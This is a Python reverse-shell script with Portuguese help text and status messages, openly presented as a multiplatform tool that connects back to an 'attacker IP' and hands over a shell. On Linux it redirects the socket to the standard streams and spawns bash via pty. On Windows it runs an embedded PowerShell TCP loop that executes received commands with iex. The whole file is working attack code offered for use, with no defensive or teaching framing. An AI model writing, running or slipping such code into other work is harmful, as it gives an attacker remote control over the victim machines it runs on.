#!/usr/bin/env python3
import socket, subprocess, os, sys, platform, argparse, time
from pathlib import Path

def HOST_HELP():
    return """
    ██████╗░██████╗░███████╗░█████╗░██████╗░███████╗██████╗░
    ██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
    ██████╔╝██████╔╝█████╗░░███████║██║░░██║█████╗░░██████╔╝
    ██╔══██╗██╔══██╗██╔══╝░░██╔══██║██║░░██║██╔══╝░░██╔══██╗
    ██║░░██║██║░░██║███████╗██║░░██║██████╔╝███████╗██║░░██║
     ╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝

    Uso: python3 reverse.py [OPÇÕES]

    OPÇÕES:
      -t, --target    IP do atacante (padrão: 192.168.0.102)
      -p, --port      Porta de conexão (padrão: 4466)
      -T, --timeout   Timeout em segundos (padrão: 10)
      -s, --shell     Shell específico (padrão: auto-detectar)
      -h, --help      Mostra esta ajuda

    """

def detectar_shell():
    shells = ["/bin/bash", "/usr/bin/bash", "/bin/sh", "/usr/bin/sh",
              "cmd.exe", "powershell.exe", "/bin/zsh", "/usr/bin/zsh"]
    for shell in shells:
        if platform.system() == "Windows":
            if shell.endswith(".exe") and os.path.exists(shell):
                return shell
            elif shell in ["cmd.exe", "powershell.exe"]:
                return shell
        else:
            if os.path.exists(shell) and os.access(shell, os.X_OK):
                return shell
    return None

def conectar_com_timeout(host, porta, timeout):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        print(f"[*] Conectando em {host}:{porta}...")
        resultado = s.connect_ex((host, porta))
        if resultado != 0:
            print(f"[!] Erro de conexão: código {resultado}")
            return None
        s.settimeout(None)
        print(f"[+] Conectado!")
        return s
    except socket.timeout:
        print(f"[!] Timeout ao conectar em {host}:{porta}")
        return None
    except socket.gaierror:
        print(f"[!] Host '{host}' não encontrado")
        return None
    except Exception as e:
        print(f"[!] Erro inesperado: {e}")
        return None

def executar_reverse_shell(s, shell):
    try:
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)

        if platform.system() == "Windows":
            if "powershell" in shell.lower():
                subprocess.call(["powershell.exe", "-NoProfile", "-Command",
                               f"$client = New-Object System.Net.Sockets.TCPClient('{s.getpeername()[0]}',{s.getpeername()[1]}); "
                               "$stream = $client.GetStream(); "
                               "[byte[]]$bytes = 0..65535|%{{0}}; "
                               "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{; "
                               "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); "
                               "$sendback = (iex $data 2>&1 | Out-String ); "
                               "$sendback2 = $sendback + '# '; "
                               "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); "
                               "$stream.Write($sendbyte,0,$sendbyte.Length); "
                               "$stream.Flush()}}; "
                               "$client.Close()"])
            else:
                subprocess.call(["cmd.exe"])
        else:
            os.environ["INPUTRC"] = "/etc/inputrc"
            rc = 'bind "set show-all-if-ambiguous on"; bind "TAB: complete"'
            subprocess.run(["bash", "-c", rc])
            import pty
            pty.spawn("/bin/bash")
    except Exception as e:
        print(f"[!] Erro ao executar shell: {e}")
    finally:
        try:
            s.close()
        except:
            pass

def main():
    parser = argparse.ArgumentParser(
        description="Reverse Shell Python Multiplataforma",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=HOST_HELP()
    )
    parser.add_argument("-t", "--target", default="192.168.0.102", help="IP do atacante")
    parser.add_argument("-p", "--port", type=int, default=4466, help="Porta de conexão")
    parser.add_argument("-T", "--timeout", type=int, default=10, help="Timeout em segundos")
    parser.add_argument("-s", "--shell", help="Shell específico")
    args = parser.parse_args()

    if args.port < 1 or args.port > 65535:
        print("[!] Porta deve estar entre 1-65535")
        sys.exit(1)
    if args.timeout < 1:
        print("[!] Timeout deve ser maior que 0")
        sys.exit(1)

    shell = args.shell or detectar_shell()
    if not shell:
        print("[!] Nenhum shell disponível")
        sys.exit(1)

    print(f"[*] Shell detectado: {shell}")
    s = conectar_com_timeout(args.target, args.port, args.timeout)
    if not s:
        sys.exit(1)

    print("[*] Executando reverse shell...")
    time.sleep(0.5)
    executar_reverse_shell(s, shell)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrompido pelo usuário")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Erro fatal: {e}")
        sys.exit(1)
